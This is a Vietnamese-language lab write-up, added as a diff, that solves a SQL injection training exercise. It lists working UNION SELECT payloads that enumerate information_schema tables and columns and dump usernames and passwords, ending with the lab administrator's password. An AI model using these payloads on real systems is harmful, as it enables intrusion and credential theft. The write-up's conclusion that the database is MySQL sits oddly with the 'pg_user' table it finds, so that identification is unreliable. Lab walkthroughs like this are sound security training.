@@ -1,0 +1,31 @@
+SQL injection - SQL injection attack, listing the database contents on non-Oracle databases
+
+End Goal: log in as the administrator user.
+
+Analysis
+--------
+Bước 1: Thêm dấu ' vào cuối liên kết để xem phản hồi từ máy chủ 
+--> Có phản hồi khác --> có thể thay đổi truy vấn 
+Bước 2: Thử thêm comment vào sau '
++) Thêm --: gần như tất cả kiểu csdl đều phù hợp --> chưa biết csdl thuộc kiểu nào
++) Thêm #: thay bằng %23 --> có phản hồi --> thuộc MySQL
+Bước 3: Thêm truy vấn ORDER BY 1-- tăng dần để xem có bao nhiêu cột được trả về
+Sau khi thử có 2 cột được trả về 
+Bước 4: Kiểm tra xem có cột nào có kiểu trả về là chuỗi không 
+--> cả 2 cột đều có kiểu trả về chuỗi 
+--> hình dung ra truy vấn của nó: SELECT title, content FROM posts WHERE category='...' and ....
+Bước 5: vì mục tiêu là login vào admin nên cần tài khoản và mật khẩu của admin --> cần chọn ra cột username và 
+password từ bảng chứa thông tin tài khoản --> cần biết tên cột --> cần biết tên bảng 
+Vì csdl là MySQL --> để xem tên bảng sử dụng truy vấn: SELECT * FROM information_schema.tables, vì ở đây có 2 cột
+trả về nên 1 cột để NULL, 1 cột đặt table_name
+--> ' UNION SELECT NULL,table_name FROM information_schema.tables--
+--> từ kết quả trả về tìm kiếm những bảng có chứa user trong tên: users_eqgzxv và pg_user
+Bước 6: Thử tìm kiếm những cột có trong bảng users_eqgzxv --> Sử dụng truy vấn:
+SELECT * FROM information _schema.columns WHERE table_name = ‘TABLE-NAME-HERE’
+--> ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users_eqgzxv'--
+--> có được tên 2 cột quan trọng là username_bntclf và password_rxelgx
+Bước 7: Sử dụng truy vấn ' UNION SELECT username_bntclf,password_rxelgx FROM users_eqgzxv-- để lấy thông tin 
+có trong bảng 
+--> lấy được tài khoản và mật khẩu của admin:
+administrator
+70f6pkv6nex3slq1r051
